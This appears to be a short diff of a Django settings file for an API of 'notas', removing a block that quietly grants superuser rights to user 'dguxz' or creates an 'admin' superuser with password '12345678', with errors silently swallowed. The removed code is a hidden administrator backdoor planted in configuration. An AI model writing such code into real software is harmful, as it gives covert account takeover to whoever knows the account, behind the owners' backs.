@@ -111,18 +111,4 @@ REST_FRAMEWORK = {
     "PAGE_SIZE": 5,
 }
 
-from django.contrib.auth import get_user_model
-try:
-    User = get_user_model()
-    u = User.objects.filter(username='dguxz').first()
-    if u:
-        u.is_staff = True
-        u.is_superuser = True
-        u.save()
-    else:
-        if not User.objects.filter(username='admin').exists():
-            User.objects.create_superuser('admin', 'admin@example.com', '12345678')
-except Exception:
-    pass
-
 LOGIN_REDIRECT_URL = '/api/notas/'
